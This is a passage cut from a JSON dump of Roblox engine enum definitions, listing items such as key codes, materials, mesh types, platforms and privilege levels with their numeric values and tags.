0,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ScrollLock","tags":[],"Value":302,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftSuper","tags":[],"Value":311,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightSuper","tags":[],"Value":312,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Mode","tags":[],"Value":313,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Compose","tags":[],"Value":314,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Help","tags":[],"Value":315,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Print","tags":[],"Value":316,"Enum":"KeyCode"},{"type":"EnumItem","Name":"SysReq","tags":[],"Value":317,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Break","tags":[],"Value":318,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Menu","tags":[],"Value":319,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Power","tags":[],"Value":320,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Euro","tags":[],"Value":321,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Undo","tags":[],"Value":322,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F1","tags":[],"Value":282,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F2","tags":[],"Value":283,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F3","tags":[],"Value":284,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F4","tags":[],"Value":285,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F5","tags":[],"Value":286,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F6","tags":[],"Value":287,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F7","tags":[],"Value":288,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F8","tags":[],"Value":289,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F9","tags":[],"Value":290,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F10","tags":[],"Value":291,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F11","tags":[],"Value":292,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F12","tags":[],"Value":293,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F13","tags":[],"Value":294,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F14","tags":[],"Value":295,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F15","tags":[],"Value":296,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World0","tags":[],"Value":160,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World1","tags":[],"Value":161,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World2","tags":[],"Value":162,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World3","tags":[],"Value":163,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World4","tags":[],"Value":164,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World5","tags":[],"Value":165,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World6","tags":[],"Value":166,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World7","tags":[],"Value":167,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World8","tags":[],"Value":168,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World9","tags":[],"Value":169,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World10","tags":[],"Value":170,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World11","tags":[],"Value":171,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World12","tags":[],"Value":172,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World13","tags":[],"Value":173,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World14","tags":[],"Value":174,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World15","tags":[],"Value":175,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World16","tags":[],"Value":176,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World17","tags":[],"Value":177,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World18","tags":[],"Value":178,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World19","tags":[],"Value":179,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World20","tags":[],"Value":180,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World21","tags":[],"Value":181,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World22","tags":[],"Value":182,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World23","tags":[],"Value":183,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World24","tags":[],"Value":184,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World25","tags":[],"Value":185,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World26","tags":[],"Value":186,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World27","tags":[],"Value":187,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World28","tags":[],"Value":188,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World29","tags":[],"Value":189,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World30","tags":[],"Value":190,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World31","tags":[],"Value":191,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World32","tags":[],"Value":192,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World33","tags":[],"Value":193,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World34","tags":[],"Value":194,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World35","tags":[],"Value":195,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World36","tags":[],"Value":196,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World37","tags":[],"Value":197,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World38","tags":[],"Value":198,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World39","tags":[],"Value":199,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World40","tags":[],"Value":200,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World41","tags":[],"Value":201,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World42","tags":[],"Value":202,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World43","tags":[],"Value":203,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World44","tags":[],"Value":204,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World45","tags":[],"Value":205,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World46","tags":[],"Value":206,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World47","tags":[],"Value":207,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World48","tags":[],"Value":208,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World49","tags":[],"Value":209,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World50","tags":[],"Value":210,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World51","tags":[],"Value":211,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World52","tags":[],"Value":212,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World53","tags":[],"Value":213,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World54","tags":[],"Value":214,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World55","tags":[],"Value":215,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World56","tags":[],"Value":216,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World57","tags":[],"Value":217,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World58","tags":[],"Value":218,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World59","tags":[],"Value":219,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World60","tags":[],"Value":220,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World61","tags":[],"Value":221,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World62","tags":[],"Value":222,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World63","tags":[],"Value":223,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World64","tags":[],"Value":224,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World65","tags":[],"Value":225,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World66","tags":[],"Value":226,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World67","tags":[],"Value":227,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World68","tags":[],"Value":228,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World69","tags":[],"Value":229,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World70","tags":[],"Value":230,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World71","tags":[],"Value":231,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World72","tags":[],"Value":232,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World73","tags":[],"Value":233,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World74","tags":[],"Value":234,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World75","tags":[],"Value":235,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World76","tags":[],"Value":236,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World77","tags":[],"Value":237,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World78","tags":[],"Value":238,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World79","tags":[],"Value":239,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World80","tags":[],"Value":240,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World81","tags":[],"Value":241,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World82","tags":[],"Value":242,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World83","tags":[],"Value":243,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World84","tags":[],"Value":244,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World85","tags":[],"Value":245,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World86","tags":[],"Value":246,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World87","tags":[],"Value":247,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World88","tags":[],"Value":248,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World89","tags":[],"Value":249,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World90","tags":[],"Value":250,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World91","tags":[],"Value":251,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World92","tags":[],"Value":252,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World93","tags":[],"Value":253,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World94","tags":[],"Value":254,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World95","tags":[],"Value":255,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonX","tags":[],"Value":1000,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonY","tags":[],"Value":1001,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonA","tags":[],"Value":1002,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonB","tags":[],"Value":1003,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR1","tags":[],"Value":1004,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL1","tags":[],"Value":1005,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR2","tags":[],"Value":1006,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL2","tags":[],"Value":1007,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR3","tags":[],"Value":1008,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL3","tags":[],"Value":1009,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonStart","tags":[],"Value":1010,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonSelect","tags":[],"Value":1011,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadLeft","tags":[],"Value":1012,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadRight","tags":[],"Value":1013,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadUp","tags":[],"Value":1014,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadDown","tags":[],"Value":1015,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Thumbstick1","tags":[],"Value":1016,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Thumbstick2","tags":[],"Value":1017,"Enum":"KeyCode"},{"type":"Enum","Name":"KeywordFilterType","tags":[]},{"type":"EnumItem","Name":"Include","tags":[],"Value":0,"Enum":"KeywordFilterType"},{"type":"EnumItem","Name":"Exclude","tags":[],"Value":1,"Enum":"KeywordFilterType"},{"type":"Enum","Name":"LeftRight","tags":[]},{"type":"EnumItem","Name":"Left","tags":[],"Value":0,"Enum":"LeftRight"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"LeftRight"},{"type":"EnumItem","Name":"Right","tags":[],"Value":2,"Enum":"LeftRight"},{"type":"Enum","Name":"LevelOfDetailSetting","tags":[]},{"type":"EnumItem","Name":"High","tags":[],"Value":2,"Enum":"LevelOfDetailSetting"},{"type":"EnumItem","Name":"Medium","tags":[],"Value":1,"Enum":"LevelOfDetailSetting"},{"type":"EnumItem","Name":"Low","tags":[],"Value":0,"Enum":"LevelOfDetailSetting"},{"type":"Enum","Name":"ListenerType","tags":[]},{"type":"EnumItem","Name":"Camera","tags":[],"Value":0,"Enum":"ListenerType"},{"type":"EnumItem","Name":"CFrame","tags":[],"Value":1,"Enum":"ListenerType"},{"type":"EnumItem","Name":"ObjectPosition","tags":[],"Value":2,"Enum":"ListenerType"},{"type":"EnumItem","Name":"ObjectCFrame","tags":[],"Value":3,"Enum":"ListenerType"},{"type":"Enum","Name":"Material","tags":[]},{"type":"EnumItem","Name":"Plastic","tags":[],"Value":256,"Enum":"Material"},{"type":"EnumItem","Name":"Wood","tags":[],"Value":512,"Enum":"Material"},{"type":"EnumItem","Name":"Slate","tags":[],"Value":800,"Enum":"Material"},{"type":"EnumItem","Name":"Concrete","tags":[],"Value":816,"Enum":"Material"},{"type":"EnumItem","Name":"CorrodedMetal","tags":[],"Value":1040,"Enum":"Material"},{"type":"EnumItem","Name":"DiamondPlate","tags":[],"Value":1056,"Enum":"Material"},{"type":"EnumItem","Name":"Foil","tags":[],"Value":1072,"Enum":"Material"},{"type":"EnumItem","Name":"Grass","tags":[],"Value":1280,"Enum":"Material"},{"type":"EnumItem","Name":"Ice","tags":[],"Value":1536,"Enum":"Material"},{"type":"EnumItem","Name":"Marble","tags":[],"Value":784,"Enum":"Material"},{"type":"EnumItem","Name":"Granite","tags":[],"Value":832,"Enum":"Material"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":848,"Enum":"Material"},{"type":"EnumItem","Name":"Pebble","tags":[],"Value":864,"Enum":"Material"},{"type":"EnumItem","Name":"Sand","tags":[],"Value":1296,"Enum":"Material"},{"type":"EnumItem","Name":"Fabric","tags":[],"Value":1312,"Enum":"Material"},{"type":"EnumItem","Name":"SmoothPlastic","tags":[],"Value":272,"Enum":"Material"},{"type":"EnumItem","Name":"Metal","tags":[],"Value":1088,"Enum":"Material"},{"type":"EnumItem","Name":"WoodPlanks","tags":[],"Value":528,"Enum":"Material"},{"type":"EnumItem","Name":"Cobblestone","tags":[],"Value":880,"Enum":"Material"},{"type":"EnumItem","Name":"Air","tags":["notbrowsable"],"Value":1792,"Enum":"Material"},{"type":"EnumItem","Name":"Water","tags":["notbrowsable"],"Value":2048,"Enum":"Material"},{"type":"EnumItem","Name":"Rock","tags":["notbrowsable"],"Value":896,"Enum":"Material"},{"type":"EnumItem","Name":"Glacier","tags":["notbrowsable"],"Value":1552,"Enum":"Material"},{"type":"EnumItem","Name":"Snow","tags":["notbrowsable"],"Value":1328,"Enum":"Material"},{"type":"EnumItem","Name":"Sandstone","tags":["notbrowsable"],"Value":912,"Enum":"Material"},{"type":"EnumItem","Name":"Mud","tags":["notbrowsable"],"Value":1344,"Enum":"Material"},{"type":"EnumItem","Name":"Basalt","tags":["notbrowsable"],"Value":788,"Enum":"Material"},{"type":"EnumItem","Name":"Ground","tags":["notbrowsable"],"Value":1360,"Enum":"Material"},{"type":"EnumItem","Name":"CrackedLava","tags":["notbrowsable"],"Value":804,"Enum":"Material"},{"type":"EnumItem","Name":"Neon","tags":[],"Value":288,"Enum":"Material"},{"type":"EnumItem","Name":"Asphalt","tags":["notbrowsable"],"Value":1376,"Enum":"Material"},{"type":"EnumItem","Name":"LeafyGrass","tags":["notbrowsable"],"Value":1284,"Enum":"Material"},{"type":"EnumItem","Name":"Salt","tags":["notbrowsable"],"Value":1392,"Enum":"Material"},{"type":"EnumItem","Name":"Limestone","tags":["notbrowsable"],"Value":820,"Enum":"Material"},{"type":"EnumItem","Name":"Pavement","tags":["notbrowsable"],"Value":836,"Enum":"Material"},{"type":"Enum","Name":"MembershipType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"MembershipType"},{"type":"EnumItem","Name":"BuildersClub","tags":[],"Value":1,"Enum":"MembershipType"},{"type":"EnumItem","Name":"TurboBuildersClub","tags":[],"Value":2,"Enum":"MembershipType"},{"type":"EnumItem","Name":"OutrageousBuildersClub","tags":[],"Value":3,"Enum":"MembershipType"},{"type":"Enum","Name":"MeshType","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"MeshType"},{"type":"EnumItem","Name":"Torso","tags":[],"Value":1,"Enum":"MeshType"},{"type":"EnumItem","Name":"Wedge","tags":[],"Value":2,"Enum":"MeshType"},{"type":"EnumItem","Name":"Prism","tags":["deprecated"],"Value":7,"Enum":"MeshType"},{"type":"EnumItem","Name":"Pyramid","tags":["deprecated"],"Value":8,"Enum":"MeshType"},{"type":"EnumItem","Name":"ParallelRamp","tags":["deprecated"],"Value":9,"Enum":"MeshType"},{"type":"EnumItem","Name":"RightAngleRamp","tags":["deprecated"],"Value":10,"Enum":"MeshType"},{"type":"EnumItem","Name":"CornerWedge","tags":["deprecated"],"Value":11,"Enum":"MeshType"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":6,"Enum":"MeshType"},{"type":"EnumItem","Name":"Sphere","tags":[],"Value":3,"Enum":"MeshType"},{"type":"EnumItem","Name":"Cylinder","tags":[],"Value":4,"Enum":"MeshType"},{"type":"EnumItem","Name":"FileMesh","tags":[],"Value":5,"Enum":"MeshType"},{"type":"Enum","Name":"MessageType","tags":[]},{"type":"EnumItem","Name":"MessageOutput","tags":[],"Value":0,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageInfo","tags":[],"Value":1,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageWarning","tags":[],"Value":2,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageError","tags":[],"Value":3,"Enum":"MessageType"},{"type":"Enum","Name":"MouseBehavior","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"MouseBehavior"},{"type":"EnumItem","Name":"LockCenter","tags":[],"Value":1,"Enum":"MouseBehavior"},{"type":"EnumItem","Name":"LockCurrentPosition","tags":[],"Value":2,"Enum":"MouseBehavior"},{"type":"Enum","Name":"MoveState","tags":[]},{"type":"EnumItem","Name":"Stopped","tags":[],"Value":0,"Enum":"MoveState"},{"type":"EnumItem","Name":"Coasting","tags":[],"Value":1,"Enum":"MoveState"},{"type":"EnumItem","Name":"Pushing","tags":[],"Value":2,"Enum":"MoveState"},{"type":"EnumItem","Name":"Stopping","tags":[],"Value":3,"Enum":"MoveState"},{"type":"EnumItem","Name":"AirFree","tags":[],"Value":4,"Enum":"MoveState"},{"type":"Enum","Name":"NameOcclusion","tags":[]},{"type":"EnumItem","Name":"OccludeAll","tags":[],"Value":2,"Enum":"NameOcclusion"},{"type":"EnumItem","Name":"EnemyOcclusion","tags":[],"Value":1,"Enum":"NameOcclusion"},{"type":"EnumItem","Name":"NoOcclusion","tags":[],"Value":0,"Enum":"NameOcclusion"},{"type":"Enum","Name":"NetworkOwnership","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"NetworkOwnership"},{"type":"EnumItem","Name":"Manual","tags":[],"Value":1,"Enum":"NetworkOwnership"},{"type":"Enum","Name":"NormalId","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":1,"Enum":"NormalId"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":4,"Enum":"NormalId"},{"type":"EnumItem","Name":"Back","tags":[],"Value":2,"Enum":"NormalId"},{"type":"EnumItem","Name":"Front","tags":[],"Value":5,"Enum":"NormalId"},{"type":"EnumItem","Name":"Right","tags":[],"Value":0,"Enum":"NormalId"},{"type":"EnumItem","Name":"Left","tags":[],"Value":3,"Enum":"NormalId"},{"type":"Enum","Name":"OverrideMouseIconBehavior","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"OverrideMouseIconBehavior"},{"type":"EnumItem","Name":"ForceShow","tags":[],"Value":1,"Enum":"OverrideMouseIconBehavior"},{"type":"EnumItem","Name":"ForceHide","tags":[],"Value":2,"Enum":"OverrideMouseIconBehavior"},{"type":"Enum","Name":"PacketPriority","tags":[]},{"type":"EnumItem","Name":"IMMEDIATE_PRIORITY","tags":[],"Value":0,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"HIGH_PRIORITY","tags":[],"Value":1,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"MEDIUM_PRIORITY","tags":[],"Value":2,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"LOW_PRIORITY","tags":[],"Value":3,"Enum":"PacketPriority"},{"type":"Enum","Name":"PacketReliability","tags":[]},{"type":"EnumItem","Name":"UNRELIABLE","tags":[],"Value":0,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"UNRELIABLE_SEQUENCED","tags":[],"Value":1,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE","tags":[],"Value":2,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE_ORDERED","tags":[],"Value":3,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE_SEQUENCED","tags":[],"Value":4,"Enum":"PacketReliability"},{"type":"Enum","Name":"PartType","tags":[]},{"type":"EnumItem","Name":"Ball","tags":[],"Value":0,"Enum":"PartType"},{"type":"EnumItem","Name":"Block","tags":[],"Value":1,"Enum":"PartType"},{"type":"EnumItem","Name":"Cylinder","tags":[],"Value":2,"Enum":"PartType"},{"type":"Enum","Name":"PathStatus","tags":[]},{"type":"EnumItem","Name":"Success","tags":[],"Value":0,"Enum":"PathStatus"},{"type":"EnumItem","Name":"ClosestNoPath","tags":[],"Value":1,"Enum":"PathStatus"},{"type":"EnumItem","Name":"ClosestOutOfRange","tags":[],"Value":2,"Enum":"PathStatus"},{"type":"EnumItem","Name":"FailStartNotEmpty","tags":[],"Value":3,"Enum":"PathStatus"},{"type":"EnumItem","Name":"FailFinishNotEmpty","tags":[],"Value":4,"Enum":"PathStatus"},{"type":"Enum","Name":"PhysicalPropertiesMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":1,"Enum":"PhysicalPropertiesMode"},{"type":"EnumItem","Name":"Legacy","tags":[],"Value":0,"Enum":"PhysicalPropertiesMode"},{"type":"EnumItem","Name":"New","tags":[],"Value":2,"Enum":"PhysicalPropertiesMode"},{"type":"Enum","Name":"PhysicsReceiveMethod","tags":[]},{"type":"EnumItem","Name":"Direct","tags":[],"Value":0,"Enum":"PhysicsReceiveMethod"},{"type":"EnumItem","Name":"Interpolation","tags":[],"Value":1,"Enum":"PhysicsReceiveMethod"},{"type":"Enum","Name":"PhysicsSendMethod","tags":[]},{"type":"EnumItem","Name":"ErrorComputation","tags":[],"Value":0,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"ErrorComputation2","tags":[],"Value":1,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"RoundRobin","tags":[],"Value":2,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"TopNErrors","tags":[],"Value":3,"Enum":"PhysicsSendMethod"},{"type":"Enum","Name":"Platform","tags":[]},{"type":"EnumItem","Name":"Windows","tags":[],"Value":0,"Enum":"Platform"},{"type":"EnumItem","Name":"OSX","tags":[],"Value":1,"Enum":"Platform"},{"type":"EnumItem","Name":"IOS","tags":[],"Value":2,"Enum":"Platform"},{"type":"EnumItem","Name":"Android","tags":[],"Value":3,"Enum":"Platform"},{"type":"EnumItem","Name":"XBoxOne","tags":[],"Value":4,"Enum":"Platform"},{"type":"EnumItem","Name":"PS4","tags":[],"Value":5,"Enum":"Platform"},{"type":"EnumItem","Name":"PS3","tags":[],"Value":6,"Enum":"Platform"},{"type":"EnumItem","Name":"XBox360","tags":[],"Value":7,"Enum":"Platform"},{"type":"EnumItem","Name":"WiiU","tags":[],"Value":8,"Enum":"Platform"},{"type":"EnumItem","Name":"NX","tags":[],"Value":9,"Enum":"Platform"},{"type":"EnumItem","Name":"Ouya","tags":[],"Value":10,"Enum":"Platform"},{"type":"EnumItem","Name":"AndroidTV","tags":[],"Value":11,"Enum":"Platform"},{"type":"EnumItem","Name":"Chromecast","tags":[],"Value":12,"Enum":"Platform"},{"type":"EnumItem","Name":"Linux","tags":[],"Value":13,"Enum":"Platform"},{"type":"EnumItem","Name":"SteamOS","tags":[],"Value":14,"Enum":"Platform"},{"type":"EnumItem","Name":"WebOS","tags":[],"Value":15,"Enum":"Platform"},{"type":"EnumItem","Name":"DOS","tags":[],"Value":16,"Enum":"Platform"},{"type":"EnumItem","Name":"BeOS","tags":[],"Value":17,"Enum":"Platform"},{"type":"EnumItem","Name":"UWP","tags":[],"Value":18,"Enum":"Platform"},{"type":"EnumItem","Name":"None","tags":[],"Value":19,"Enum":"Platform"},{"type":"Enum","Name":"PlayerActions","tags":[]},{"type":"EnumItem","Name":"CharacterForward","tags":[],"Value":0,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterBackward","tags":[],"Value":1,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterLeft","tags":[],"Value":2,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterRight","tags":[],"Value":3,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterJump","tags":[],"Value":4,"Enum":"PlayerActions"},{"type":"Enum","Name":"PlayerChatType","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"PlayerChatType"},{"type":"EnumItem","Name":"Team","tags":[],"Value":1,"Enum":"PlayerChatType"},{"type":"EnumItem","Name":"Whisper","tags":[],"Value":2,"Enum":"PlayerChatType"},{"type":"Enum","Name":"PoseEasingDirection","tags":[]},{"type":"EnumItem","Name":"Out","tags":[],"Value":1,"Enum":"PoseEasingDirection"},{"type":"EnumItem","Name":"InOut","tags":[],"Value":2,"Enum":"PoseEasingDirection"},{"type":"EnumItem","Name":"In","tags":[],"Value":0,"Enum":"PoseEasingDirection"},{"type":"Enum","Name":"PoseEasingStyle","tags":[]},{"type":"EnumItem","Name":"Linear","tags":[],"Value":0,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Constant","tags":[],"Value":1,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Elastic","tags":[],"Value":2,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Cubic","tags":[],"Value":3,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Bounce","tags":[],"Value":4,"Enum":"PoseEasingStyle"},{"type":"Enum","Name":"PriorityMethod","tags":[]},{"type":"EnumItem","Name":"LastError","tags":[],"Value":0,"Enum":"PriorityMethod"},{"type":"EnumItem","Name":"AccumulatedError","tags":[],"Value":1,"Enum":"PriorityMethod"},{"type":"EnumItem","Name":"FIFO","tags":[],"Value":2,"Enum":"PriorityMethod"},{"type":"Enum","Name":"PrismSides","tags":[]},{"type":"EnumItem","Name":"3","tags":[],"Value":3,"Enum":"PrismSides"},{"type":"EnumItem","Name":"5","tags":[],"Value":5,"Enum":"PrismSides"},{"type":"EnumItem","Name":"6","tags":[],"Value":6,"Enum":"PrismSides"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"PrismSides"},{"type":"EnumItem","Name":"10","tags":[],"Value":10,"Enum":"PrismSides"},{"type":"EnumItem","Name":"20","tags":[],"Value":20,"Enum":"PrismSides"},{"type":"Enum","Name":"PrivilegeType","tags":[]},{"type":"EnumItem","Name":"Owner","tags":[],"Value":255,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Admin","tags":[],"Value":240,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Member","tags":[],"Value":128,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Visitor","tags":[],"Value":10,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Banned","tags":[],"Value":0,"Enum":"PrivilegeType"},{"type":"Enum","Name":"ProductPurchaseDecision","tags":[]},{"type":"EnumItem","Name":"NotProcessedYet","tags":[],"Value":0,"Enum":"ProductPurchaseDecision"},{"type":"EnumItem","Name":"PurchaseGranted","tags":[],"Value":1,"Enum":"ProductPurchaseDecision"},{"type":"Enum","Name":"PyramidSides","tags":[]},{"type":"EnumItem","Name":"3","tags":[],"Value":3,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"4","tags":[],"Value":4,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"5","tags":[],"Value":5,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"6","tags":[],"Value":6,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"10","tags":[],"Value":10,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"20","tags":[],"Value":20,"Enum":"PyramidSides"},{"type":"Enum","Name":"QualityLevel","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level01","tags":[],"Value":1,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level02","tags":[],"Value":2,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level03","tags":[